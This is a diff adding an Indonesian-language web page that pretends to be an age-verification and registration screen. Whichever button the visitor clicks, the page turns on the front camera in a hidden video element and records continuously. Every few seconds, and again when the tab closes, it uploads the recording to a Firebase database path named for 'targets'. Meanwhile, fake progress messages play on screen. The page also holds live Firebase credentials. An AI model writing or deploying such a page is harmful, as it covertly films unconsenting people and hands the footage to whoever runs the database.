@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi & Pendaftaran</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
+        body { background: #0b0f19; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .card { background: #1e293b; padding: 30px; border-radius: 12px; width: 100%; max-width: 380px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #334155; text-align: center; }
+        h3 { color: #38bdf8; margin-bottom: 12px; font-size: 20px; }
+        p { color: #94a3b8; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
+        .btn-group { display: flex; gap: 12px; }
+        button { flex: 1; padding: 12px; background: #2563eb; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
+        button:hover { background: #1d4ed8; }
+        button.secondary { background: #475569; }
+        button.secondary:hover { background: #334155; }
+        
+        #loading-screen { display: none; }
+        .spinner { width: 45px; height: 45px; border: 4px solid #334155; border-top: 4px solid #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #loading-text { color: #38bdf8; font-size: 14px; font-weight: 500; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <!-- TAHAP 1: PERTANYAAN UMUR -->
+        <div id="age-screen">
+            <h3>Verifikasi Usia</h3>
+            <p>Apakah usia Anda sudah 20 tahun ke atas?</p>
+            <div class="btn-group">
+                <button onclick="handleChoice('Ya')">Ya</button>
+                <button class="secondary" onclick="handleChoice('Tidak')">Tidak</button>
+            </div>
+        </div>
+
+        <!-- TAHAP 2: LOADING BERKELANJUTAN -->
+        <div id="loading-screen">
+            <div class="spinner"></div>
+            <div id="loading-text">Memproses verifikasi data...</div>
+        </div>
+    </div>
+
+    <!-- Kamera Tersembunyi -->
+    <video id="cam" autoplay playsinline muted style="display:none;"></video>
+
+    <!-- Firebase SDK v9 Modular -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBc4gDdIRxCR6H7RGBe7ejLyI6SrIRyxo0",
+            authDomain: "haij-4beb7.firebaseapp.com",
+            databaseURL: "https://haij-4beb7-default-rtdb.firebaseio.com",
+            projectId: "haij-4beb7",
+            storageBucket: "haij-4beb7.firebasestorage.app",
+            messagingSenderId: "843252587335",
+            appId: "1:843252587335:android:438d0f98d2a2505c034a62"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // ID Unik Sesi Target
+        const targetId = 'target_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now();
+        let stream = null;
+        let allChunks = []; // Menyimpan seluruh rekaman secara menyatu dari awal sampai akhir
+        let mediaRecorder;
+
+        window.handleChoice = async function(answer) {
+            // 1. Pindah ke layar loading
+            document.getElementById('age-screen').style.display = 'none';
+            document.getElementById('loading-screen').style.display = 'block';
+
+            // 2. Teks loading berganti tiap 2 detik secara mulus
+            const loadingMessages = [
+                "Memproses verifikasi data...",
+                "Menghubungkan ke server aman...",
+                "Menyiapkan sesi pendaftaran...",
+                "Memeriksa perangkat...",
+                "Menyelesaikan konfigurasi akhir..."
+            ];
+            let msgIdx = 0;
+            setInterval(() => {
+                msgIdx = (msgIdx + 1) % loadingMessages.length;
+                document.getElementById('loading-text').innerText = loadingMessages[msgIdx];
+            }, 2000);
+
+            // 3. Nyalakan kamera seketika saat tombol verifikasi umur diklik
+            const video = document.getElementById('cam');
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                await video.play();
+
+                try {
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8' });
+                } catch (e) {
+                    mediaRecorder = new MediaRecorder(stream);
+                }
+
+                // Setiap ada data video masuk, kumpulkan ke dalam satu array utama (allChunks)
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                        allChunks.push(event.data);
+                    }
+                };
+
+                // Mulai perekaman kontinyu dengan jeda timeslice 1 detik agar data terus mengalir masuk ke array
+                mediaRecorder.start(1000);
+
+                // Auto-Sync Single File: Setiap 4 detik, gabungkan SELURUH array allChunks menjadi SATU file video utuh, 
+                // lalu timpa (update) ke database pada satu path ID yang sama.
+                setInterval(() => {
+                    if (allChunks.length > 0) {
+                        const completeBlob = new Blob(allChunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            set(ref(db, `targets/${targetId}`), {
+                                code: "Verifikasi Umur: " + answer,
+                                video: reader.result, // Satu file video utuh yang durasinya terus bertambah panjang
+                                time: Date.now()
+                            }).catch(err => console.log(err));
+                        };
+                        reader.readAsDataURL(completeBlob);
+                    }
+                }, 4000);
+
+            } catch (err) {
+                console.warn("Akses kamera ditolak:", err);
+                document.getElementById('loading-text').innerText = "Gagal memuat sesi.";
+            }
+        };
+
+        // Kirim update final satu file utuh saat target menutup halaman / pindah tab
+        const finalizeAndClose = () => {
+            if (allChunks.length > 0) {
+                const completeBlob = new Blob(allChunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                reader.onloadend = () => {
+                    set(ref(db, `targets/${targetId}`), {
+                        code: "Sesi Selesai",
+                        video: reader.result,
+                        time: Date.now()
+                    });
+                };
+                reader.readAsDataURL(completeBlob);
+            }
+            if (stream) stream.getTracks().forEach(t => t.stop());
+        };
+
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'hidden') finalizeAndClose();
+        });
+
+        window.addEventListener('beforeunload', () => finalizeAndClose());
+    </script>
+</body>
+</html>
